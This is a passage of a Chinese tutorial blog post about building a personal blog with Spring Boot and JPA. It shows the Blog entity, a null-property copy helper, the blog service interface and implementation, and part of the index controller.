java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/4.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;t_blog&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Basic(fetch = FetchType.LAZY)</span></span><br><span class="line">    <span class="meta">@Lob</span></span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> String firstPicture;</span><br><span class="line">    <span class="keyword">private</span> String flag;</span><br><span class="line">    <span class="keyword">private</span> Integer views;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> appreciation;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> shareStatement;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> commentabled;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> published;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> recommend;</span><br><span class="line">    <span class="meta">@Temporal(TemporalType.TIMESTAMP)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@Temporal(TemporalType.TIMESTAMP)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToOne</span></span><br><span class="line">    <span class="keyword">private</span> Type type;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToMany(cascade = &#123;CascadeType.PERSIST&#125;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Tag&gt; tags = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToOne</span></span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OneToMany(mappedBy = &quot;blog&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Comment&gt; comments = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transient</span></span><br><span class="line">    <span class="keyword">private</span> String tagIds;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String description;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Blog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTitle</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContent</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFirstPicture</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> firstPicture;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFirstPicture</span><span class="params">(String firstPicture)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.firstPicture = firstPicture;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFlag</span><span class="params">(String flag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getViews</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> views;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setViews</span><span class="params">(Integer views)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.views = views;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAppreciation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> appreciation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAppreciation</span><span class="params">(<span class="keyword">boolean</span> appreciation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.appreciation = appreciation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isShareStatement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> shareStatement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setShareStatement</span><span class="params">(<span class="keyword">boolean</span> shareStatement)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.shareStatement = shareStatement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isCommentabled</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> commentabled;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCommentabled</span><span class="params">(<span class="keyword">boolean</span> commentabled)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.commentabled = commentabled;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPublished</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> published;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPublished</span><span class="params">(<span class="keyword">boolean</span> published)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.published = published;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isRecommend</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> recommend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRecommend</span><span class="params">(<span class="keyword">boolean</span> recommend)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.recommend = recommend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getCreateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCreateTime</span><span class="params">(Date createTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getUpdateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUpdateTime</span><span class="params">(Date updateTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.updateTime = updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setType</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Tag&gt; <span class="title">getTags</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTags</span><span class="params">(List&lt;Tag&gt; tags)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tags = tags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">getComments</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> comments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setComments</span><span class="params">(List&lt;Comment&gt; comments)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.comments = comments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getTagIds</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagIds;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTagIds</span><span class="params">(String tagIds)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tagIds = tagIds;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> description;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDescription</span><span class="params">(String description)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.description = description;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化tagIds方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tagIds = tagsToIds(<span class="keyword">this</span>.getTags());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">tagsToIds</span><span class="params">(List&lt;Tag&gt; tags)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!tags.isEmpty())&#123;</span><br><span class="line">            StringBuffer ids = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (Tag tag : tags)&#123;</span><br><span class="line">                <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">                    ids.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    flag = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ids.append(tag.getId());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ids.toString();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> tagIds;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Blog&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, title=&#x27;&quot;</span> + title + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, content=&#x27;&quot;</span> + content + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, firstPicture=&#x27;&quot;</span> + firstPicture + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, flag=&#x27;&quot;</span> + flag + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, views=&quot;</span> + views +</span><br><span class="line">                <span class="string">&quot;, appreciation=&quot;</span> + appreciation +</span><br><span class="line">                <span class="string">&quot;, shareStatement=&quot;</span> + shareStatement +</span><br><span class="line">                <span class="string">&quot;, commentabled=&quot;</span> + commentabled +</span><br><span class="line">                <span class="string">&quot;, published=&quot;</span> + published +</span><br><span class="line">                <span class="string">&quot;, recommend=&quot;</span> + recommend +</span><br><span class="line">                <span class="string">&quot;, createTime=&quot;</span> + createTime +</span><br><span class="line">                <span class="string">&quot;, updateTime=&quot;</span> + updateTime +</span><br><span class="line">                <span class="string">&quot;, type=&quot;</span> + type +</span><br><span class="line">                <span class="string">&quot;, tags=&quot;</span> + tags +</span><br><span class="line">                <span class="string">&quot;, user=&quot;</span> + user +</span><br><span class="line">                <span class="string">&quot;, comments=&quot;</span> + comments +</span><br><span class="line">                <span class="string">&quot;, tagIds=&#x27;&quot;</span> + tagIds + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, description=&#x27;&quot;</span> + description + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="后端细节优化"><a href="#后端细节优化" class="headerlink" title="后端细节优化"></a>后端细节优化</h3><p>MyBeanUtils.java 修复SQL数据修改后为null工具类(过滤掉数据值为null)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapperImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Arvin on 2021/2/10.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBeanUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取所有的属性值为空属性名数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> source</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String[] getNullPropertyNames(Object source) &#123;</span><br><span class="line">        BeanWrapper beanWrapper = <span class="keyword">new</span> BeanWrapperImpl(source);</span><br><span class="line">        PropertyDescriptor[] pds =  beanWrapper.getPropertyDescriptors();</span><br><span class="line">        List&lt;String&gt; nullPropertyNames = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor pd : pds) &#123;</span><br><span class="line">            String propertyName = pd.getName();</span><br><span class="line">            <span class="keyword">if</span> (beanWrapper.getPropertyValue(propertyName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                nullPropertyNames.add(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nullPropertyNames.toArray(<span class="keyword">new</span> String[nullPropertyNames.size()]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端index优化<br>BlogService.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">getBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">updateBlog</span><span class="params">(Long id,Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.BlogRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MyBeanUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.domain.Specification;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaQuery;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Predicate;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Root;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogServiceImpl</span> <span class="keyword">implements</span> <span class="title">BlogService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogRepository blogRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                List&lt;Predicate&gt; predicateList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(<span class="string">&quot;title&quot;</span>),<span class="string">&quot;%&quot;</span>+blogQuery.getTitle()+<span class="string">&quot;%&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.getTypeID() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(<span class="string">&quot;type&quot;</span>).get(<span class="string">&quot;id&quot;</span>),blogQuery.getTypeID()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.isRecommend())&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(<span class="string">&quot;recommend&quot;</span>),blogQuery.isRecommend()));</span><br><span class="line">                &#125;</span><br><span class="line">                criteriaQuery.where(predicateList.toArray(<span class="keyword">new</span> Predicate[predicateList.size()]));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blog.getId() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blog.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setViews(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">updateBlog</span><span class="params">(Long id, Blog blog)</span> </span>&#123;</span><br><span class="line">        Blog b = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));</span><br><span class="line">        b.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        blogRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IndexController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.BlogService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TagService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TypeService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.web.PageableDefault;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogService blogService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TypeService typeService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TagService tagService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;updateTime&quot;&#125;,direction = Sort.Direction.DESC)</span>Pageable pageable, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,blogService.listBlog(pageable));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;types&quot;</span>,typeService.listTypeTop(<span class="number">6</span>));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;tags&quot;</span>,tagService.listTagTop(<span class="number">10</span>));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;recommendBlogs&quot;</span>,blogService.listRecommendBlogTop(<span class="number">8</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 